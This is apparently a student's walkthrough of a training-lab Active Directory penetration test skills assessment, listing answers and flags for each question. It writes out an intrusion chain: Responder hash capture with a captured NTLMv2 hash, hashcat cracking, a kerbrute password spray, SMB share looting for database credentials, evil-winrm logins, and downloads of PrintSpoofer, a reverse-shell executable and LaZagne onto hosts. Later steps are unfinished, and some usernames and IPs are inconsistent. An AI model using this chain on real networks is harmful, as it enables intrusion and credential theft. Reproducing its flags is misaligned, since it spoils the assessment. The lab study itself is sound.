Scenario
Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.



xfreerdp /v:10.129.2.44 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
SSH to 10.129.32.184 (ACADEMY-EA-PAR01-SA2) with user "htb-student" and password "HTB_@cademy_stdnt!"

Question 1 - Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
1) ssh htb-student@10.129.32.184
2) ifconfig -a 
3) from output we know our network is 172.16.7.0/23
4) nmap -T5 -A 172.6.17.0/23 -> find 4 hosts -> inlanefreight.local (172.16.7.3) + 172.16.7.50 (MS01.INLANEFREIGHT.LOCAL) + 172.16.7.60 ( SQL01.INLANEFREIGHT.LOCAL) + 172.16.7.240 ( no DNS name, maybe web server? ) 
5) lets set up proxychains early for this one lol -> log out of ssh and re-login with ssh -D 9050 htb-student@10.129.32.184
6) good to go with proxychains. 
7) inside of the SSH session run -> sudo responder -I ens224 and wait for some hashes 
8) from output of responder we see hte user = AB920 
9) for Hash go to cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt

AB920::INLANEFREIGHT:052340f8c121128b:C8B1C93071EA544C7A3350D3CFC7B809:010100000000000000229CD0E77EDB0150906645905A397D00000000020008004A0037005700450001001E00570049004E002D00340034004C005500520045005600350047005400320004003400570049004E002D00340034004C00550052004500560035004700540032002E004A003700570045002E004C004F00430041004C00030014004A003700570045002E004C004F00430041004C00050014004A003700570045002E004C004F00430041004C000700080000229CD0E77EDB0106000400020000000800300030000000000000000000000000200000E9F1F96D0B3F6B2DA3B889C37A8CB7EEE5AC51BC722548E5052D7810D905A4630A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
10) put hash in file on host machine 
11) hashcat -m 5600 AB920 /usr/share/wordlists/rockyou.txt
12) cracked - weasal




Question 2 - What is this user's cleartext password? - weasal
1) steps above

Question 3 -  Submit the contents of the C:\flag.txt file on MS01. - aud1t_gr0up_m3mbersh1ps!
1) ON SSH SESSION -> crackmapexec winrm 172.16.7.50 -u 'AB920' -p 'weasal' 
2) we see we cau use evil winrm 
3) ON SSH SESSION -> evil-winrm -i 172.16.7.50 -u AB920 -p weasal
4) logged in as AB920 on MS01 -> cd C:\ -> type flag.txt - aud1t_gr0up_m3mbersh1ps!


Question 4 - Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. - BRO86
1) run net accounts ON EVIL WINRM session
2) we see theres no lockout threshold so we can brute force yo. 
3) xfreerdp on AB920 so we can use powershell and import-module PowerView
4) once PwoerView.ps1 is imported run -> Get-DomainUser | Select-Object samaccountname > adusers.txt
5) then we can run passwordspray with kerberute -> kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 adusers.txt pass.txt (any top 10000 password list will work) 
6) VALID LOGIN:  BR086@inlanefreight.local:Welcome1

Question 5 - What is this user's password? - Welcome1 
1) steps above 



Question 6 - Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? - D@ta_bAse_adm1n! 
1) smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R "Department Shares" 
2) we see a web.config file in the Department Shares\IT\Private\Development\ file share 
3) ive tried to download this multiple times but get weird erros.. literally. SOO ->
4) smbclient \\\\172.16.7.3\\Department\ Shares -U 'inlanefreight.local\BR086'
5)cd \IT\Private\Development
6) more web.config -> 
Output: User ID=netdb;Password=D@ta_bAse_adm1n!"


Question 7 - Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. - s3imp3rs0nate_cl@ssic
1) log into htb-student ssh 
2)
i neeed to come back to thsi and write the steps out cause holy shit. 

scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN -> 

Invoke-WebRequest -URI http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile .\PrintSpoofer.exe
Invoke-WebRequest -URI http://172.16.7.240:8000/shell.exe -OutFile .\rshell.exe

Question 8 - Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. - exc3ss1ve_adm1n_r1ights! 
scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN ->

Invoke-WebRequest -URI http://172.16.7.240:8000/LaZagne.exe -OutFile .\LaZagne.exe -> make suer we are loading this to 172.16.7.60 ? i think.. this is the SQL box?

Question 9 - Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?


proxychains xfreerdp /v:172.16.7.50 /u:BRO86 /p:Welcome! /drive:shared,/home/htb-ac-1235531/Desktop 


Question 10 -  Crack this user's password hash and submit the cleartext password as your answer. - charlie1 



Question 11 -  Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. - acLs_f0r_th3_w1n!
